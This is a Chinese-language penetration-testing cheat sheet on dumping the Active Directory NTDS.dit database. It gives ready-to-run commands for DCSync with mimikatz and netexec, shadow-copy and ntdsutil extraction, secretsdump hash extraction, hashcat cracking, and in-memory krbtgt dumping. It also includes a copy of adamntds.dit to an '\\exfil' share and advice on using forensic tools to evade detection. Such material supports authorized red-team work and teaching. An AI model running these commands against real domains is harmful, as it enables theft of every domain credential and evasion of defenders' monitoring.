# Active Directory - NTDS 导出

提取 NTDS 需要以下文件：

- NTDS.dit 文件
- SYSTEM 注册表（`C:\Windows\System32\SYSTEM`）

通常可以在两个位置找到 NTDS：`systemroot\NTDS\ntds.dit` 和 `systemroot\System32\ntds.dit`。

- `systemroot\NTDS\ntds.dit` 存储域控制器上正在使用的数据库。它包含域的值以及林的值副本（配置容器数据）。
- `systemroot\System32\ntds.dit` 是默认目录的分发副本，在运行 Windows Server 2003 或更高版本的服务器上安装 Active Directory 以创建域控制器时使用。因为此文件可用，你可以在不使用服务器操作系统 CD 的情况下运行 Active Directory 安装向导。

但你可以将位置更改为自定义路径，你需要查询注册表以获取当前位置。

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

## DCSync 攻击

DCSync 是攻击者用来从 Active Directory 环境中的域控制器获取敏感信息（包括密码哈希）的技术。管理员、域管理员或企业管理员的任何成员以及域控制器计算机帐户都能够运行 DCSync 来提取密码数据。

- DCSync 单个用户

  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
  ```

- DCSync 域中所有用户

  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /all /csv

  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
  ```

> :warning: 操作安全注意：复制始终在 2 台计算机之间进行。从用户帐户执行 DCSync 可能会触发告警。

## 卷影副本

VSS 是一项 Windows 服务，允许用户在特定时间点创建数据的快照或备份。攻击者可以滥用此服务来访问和复制敏感数据，即使这些数据当前正在被另一个进程使用或锁定。

- [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)

  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
  ```

- [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)

  ```powershell
  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
  ```

- [Pennyw0rth/NetExec](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit) - VSS 模块

  ```powershell
  nxc smb 10.10.0.202 -u username -p password --ntds vss
  ```

在 GUI 中访问 VSS 快照的替代方式：

- 选择一个快照，转到"以前的版本"选项卡
- 查看属性并恢复路径，格式为 `@GMT-yyyy.MM.dd-HH.mm.ss`

  ```ps1
  Y:\@GMT-2025.07.10-13.05.00
  ```

## 取证工具

避免或减少检测的好方法是使用常见取证工具来导出 NTDS.dit 文件和 SYSTEM 注册表。通过使用广泛认可的合法取证软件，该过程可以更隐蔽地进行，触发安全告警的风险也更低。

- 使用 [magnet/dumpit](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/) 导出内存
- 使用 volatility 提取 `SYSTEM` 注册表

  ```ps1
  volatility -f test.raw windows.registry.printkey.PrintKey
  volatility --profile=Win10x64_14393 dumpregistry -o 0xaf0287e41000 -D output_vol -f test.raw
  ```

- 使用 [exterro/ftk-imager](https://www.exterro.com/digital-forensics-software/ftk-imager) 读取磁盘的原始状态
    - 转到 `File` -> `Add Evidence Item` -> `Physical Drive` -> `Select the C drive`。
    - 导出 `C:\Windows\NTDS\ntds.dit`。
- 最后使用 secretdump：`secretsdump.py LOCAL -system output_vol/registry.0xaf0287e41000.SYSTEM.reg -ntds ntds.dit`

## 从 ntds.dit 中提取哈希

然后你需要使用 [impacket/secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) 来提取哈希，使用 `LOCAL` 选项在获取的 ntds.dit 上操作

```java
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) 也支持远程操作

```java
./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

- `-pwd-last-set`：显示每个 NTDS.DIT 帐户的 pwdLastSet 属性。
- `-user-status`：显示用户是否被禁用。

## 从 adamntds.dit 中提取哈希

AD LDS 将数据存储在位于 `C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit` 的 dit 文件中。

- 使用 `vssadmin.exe` 通过卷影副本导出 adamntds.dit

    ```ps1
    vssadmin.exe create shadow /For=C:
    cp "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Program files\Microsoft ADAM\instance1\data\adamntds.dit" \\exfil\data\adamntds.dit
    ```

- 使用 `wbadmin.exe` 通过 Windows Server Backup 导出 adamntds.dit

    ```ps1
    wbadmin.exe start backup -backupTarget:e: -vssCopy -include:"C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit"
    wbadmin.exe start recovery -version:08/04/2023-12:59 -items:"c:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit" -itemType:File -recoveryTarget:C:\Users\Administrator\Desktop\ -backupTarget:e:
    ```

- 使用 [synacktiv/ntdissector](https://github.com/synacktiv/ntdissector) 提取哈希

    ```ps1
    ntdissector path/to/adamntds.dit
    python ntdissector/tools/user_to_secretsdump.py path/to/output/*.json
    ```

## 使用 hashcat 破解 NTLM 哈希

当你需要获取明文密码或需要对弱密码进行统计时很有用。

推荐字典：

- [Rockyou.txt](https://weakpass.com/wordlist/90)
- [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
- [Weakpass.com](https://weakpass.com/)
- 更多内容请阅读 [Methodology and Resources/Hash Cracking.md](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/)

```powershell
# 基本字典攻击
# (-O) 将针对 32 个字符或更少的密码进行优化
# (-w 4) 将工作负载设置为"疯狂"
$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2

# 基于字典生成自定义掩码
$ git clone https://github.com/iphelix/pack/blob/master/README
$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
```

:warning: 如果密码不是机密数据（挑战赛/CTF），可以使用在线"破解器"如：

- [hashmob.net](https://hashmob.net)
- [crackstation.net](https://crackstation.net)
- [hashes.com](https://hashes.com/en/decrypt/hash)

## NTDS 可逆加密

`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED`（[0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm)），如果设置了此位，则该用户的密码以加密形式存储在目录中 - 但以可逆方式。

用于加密和解密的密钥是 SYSKEY，存储在注册表中，可以由域管理员提取。
这意味着哈希可以轻松地反转为明文值，因此称为"可逆加密"。

- 列出启用了"使用可逆加密存储密码"的用户

    ```powershell
    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    ```

密码检索已由 [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) 和 mimikatz 处理，它将以 CLEARTEXT 显示。

## 从内存中提取哈希

在域控制器上运行时导出 Active Directory 域中的凭据数据。

:warning: 需要具有调试权限的管理员访问权限或 NT-AUTHORITY\SYSTEM 帐户。

```powershell
mimikatz> privilege::debug
mimikatz> sekurlsa::krbtgt
mimikatz> lsadump::lsa /inject /name:krbtgt
```

## 参考资料

- [Bypassing EDR NTDS.dit protection using BlueTeam tools - bilal al-qurneh - June 9, 2024](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)
- [Diskshadow The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
- [Dumping Domain Password Hashes - Pentestlab - July 4, 2018](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
- [Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - December 06, 2023](https://www.synacktiv.com/publications/using-ntdissector-to-extract-secrets-from-adam-ntds-files)
